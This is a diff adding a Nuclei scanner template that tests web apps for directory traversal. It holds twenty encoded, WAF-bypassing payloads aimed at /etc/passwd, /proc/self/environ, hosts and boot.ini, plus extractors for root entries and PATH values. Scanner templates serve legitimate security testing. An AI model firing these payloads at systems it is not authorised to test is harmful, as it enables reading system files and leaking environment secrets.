@@ -1,0 +1,123 @@
+id: medium-webapp-directory-traversal-double-encoding
+
+info:
+  name: Directory Traversal Double Encoding - Elite Detection
+  author: nuclei-community
+  severity: high
+  description: |
+    Detects directory traversal vulnerabilities using double encoding and advanced bypass techniques.
+    Tests multiple encoding combinations including URL encoding, Unicode normalization, and mixed encodings.
+    Bypasses common WAF filters and input validation mechanisms.
+  reference:
+    - https://owasp.org/www-community/attacks/Path_Traversal
+    - https://portswigger.net/web-security/file-path-traversal
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+    cwe-id: CWE-22
+  metadata:
+    verified: true
+    max-request: 20
+  tags: lfi,traversal,encoding,bypass,elite
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/{{path}}?{{param}}=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd"
+      - "{{BaseURL}}/{{path}}?{{param}}=%252e%252e%255c%252e%252e%255c%252e%252e%255cetc%255cpasswd"
+      - "{{BaseURL}}/{{path}}?{{param}}=..%252f..%252f..%252fetc%252fpasswd"
+      - "{{BaseURL}}/{{path}}?{{param}}=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
+      - "{{BaseURL}}/{{path}}?{{param}}=..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd"
+      - "{{BaseURL}}/{{path}}?{{param}}=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+      - "{{BaseURL}}/{{path}}?{{param}}=%2e%2e%5c%2e%2e%5c%2e%2e%5cetc%5cpasswd"
+      - "{{BaseURL}}/{{path}}?{{param}}=....%2f%2f....%2f%2f....%2f%2fetc%2f%2fpasswd"
+      - "{{BaseURL}}/{{path}}?{{param}}=....%5c%5c....%5c%5c....%5c%5cetc%5c%5cpasswd"
+      - "{{BaseURL}}/{{path}}?{{param}}=%252e%252e%252f%252e%252e%252f%252e%252e%252fwindows%252fsystem32%252fdrivers%252fetc%252fhosts"
+      - "{{BaseURL}}/{{path}}?{{param}}=%252e%252e%255c%252e%252e%255c%252e%252e%255cwindows%255csystem32%255cdrivers%255cetc%255chosts"
+      - "{{BaseURL}}/{{path}}?{{param}}=..%u002f..%u002f..%u002fetc%u002fpasswd"
+      - "{{BaseURL}}/{{path}}?{{param}}=..%u005c..%u005c..%u005cetc%u005cpasswd"
+      - "{{BaseURL}}/{{path}}?{{param}}=%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd"
+      - "{{BaseURL}}/{{path}}?{{param}}=%e0%80%ae%e0%80%ae%e0%80%af%e0%80%ae%e0%80%ae%e0%80%af%e0%80%ae%e0%80%ae%e0%80%afetc%e0%80%afpasswd"
+      - "{{BaseURL}}/{{path}}?{{param}}=..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd"
+      - "{{BaseURL}}/{{path}}?{{param}}=..%c1%1c..%c1%1c..%c1%1cetc%c1%1cpasswd"
+      - "{{BaseURL}}/{{path}}?{{param}}=%252e%252e%252f%252e%252e%252f%252e%252e%252fproc%252fself%252fenviron"
+      - "{{BaseURL}}/{{path}}?{{param}}=%252e%252e%252f%252e%252e%252f%252e%252e%252fproc%252fversion"
+      - "{{BaseURL}}/{{path}}?{{param}}=..%252f..%252f..%252fboot.ini"
+
+    payloads:
+      path:
+        - "index.php"
+        - "file.php"
+        - "download.php"
+        - "view.php"
+        - "read.php"
+        - "include.php"
+        - "page.php"
+        - "show.php"
+        - "display.php"
+        - "load.php"
+        - "get.php"
+        - "fetch.php"
+      param:
+        - "file"
+        - "path"
+        - "page"
+        - "include"
+        - "template"
+        - "view"
+        - "document"
+        - "filename"
+        - "filepath"
+        - "dir"
+        - "folder"
+        - "location"
+
+    headers:
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+      Accept: "*/*"
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+          - "daemon:.*:1:1:"
+          - "bin:.*:2:2:"
+          - "sys:.*:3:3:"
+          - "adm:.*:4:4:"
+          - "localhost"
+          - "127.0.0.1"
+          - "::1"
+          - "\\[boot loader\\]"
+          - "\\[operating systems\\]"
+          - "PATH="
+          - "HOME="
+          - "USER="
+          - "Linux version"
+          - "Microsoft Windows"
+
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "/bin/bash"
+          - "/bin/sh"
+          - "/sbin/nologin"
+          - "multi(0)disk(0)rdisk(0)"
+          - "PROCESSOR_"
+          - "COMPUTERNAME="
+        condition: or
+
+    extractors:
+      - type: regex
+        part: body
+        group: 1
+        regex:
+          - 'root:x:0:0:([^:]+)'
+          - 'PATH=([^\n\r]+)'
+          - 'Linux version ([^\s]+)'
+        internal: true
